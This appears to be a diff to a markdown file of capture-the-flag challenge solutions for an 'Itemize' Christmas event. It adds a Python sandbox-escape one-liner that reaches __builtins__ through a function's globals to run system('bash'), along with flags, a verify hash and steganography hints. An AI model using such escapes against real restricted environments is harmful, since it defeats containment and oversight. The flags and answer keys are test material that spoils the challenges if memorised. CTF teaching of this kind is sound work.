@@ -2,13 +2,27 @@
 
 ### Description
 
+TBA
+
 ### Category
+
+reverse/misc
+
+### Solution
+
+`print(show.__globals__['__builtins__'].__import__("os").system("bash"))`
+
+Flag: `Itemize{n1ss3ns_l1st3_9000}`
+
+Flag format: `Itemize{l33t_t3xt}`
+
+Verify hash: `3d5dac89d1393d3513fde2d1b62eeb59`
 
 # Week 3 - easy challenge
 
 ### Description
 
-Styret i Itemize fikk i dag et meget spesielt julekort levert i den elektroniske postkassen våres. Julekortet har ingen bakside, og derfor heller ingen tekst knyttet til seg. Klarer du å finne ut hva julekortet inneholder?
+Styret i Itemize fikk i dag et meget spesielt julekort levert i postkassen. Julekortet har ingen bakside, og derfor heller ingen tekst knyttet til seg. Klarer du å finne ut hva julekortet inneholder?
 
 https://cloud.itemize.no/s/iQnKKdQdaZ8Hx2j
 
@@ -20,7 +34,7 @@ stego/misc
 
 - Aperisolve the postcard for QR code
 - Scanning the QR code sends to https://christmas.ctf.itemize.no/
-- Change false to true and click the button, or alternatively go to https://christmas.ctf.itemize.no/h0h0h0.html for flag
+- Change onclick event condition from false to true and click the button, or alternatively reverse the obfuscared code and go to https://christmas.ctf.itemize.no/h0h0h0.html for flag
 
 Flag: `Itemize{3n_kj3d3l1g_g4v3}`
 
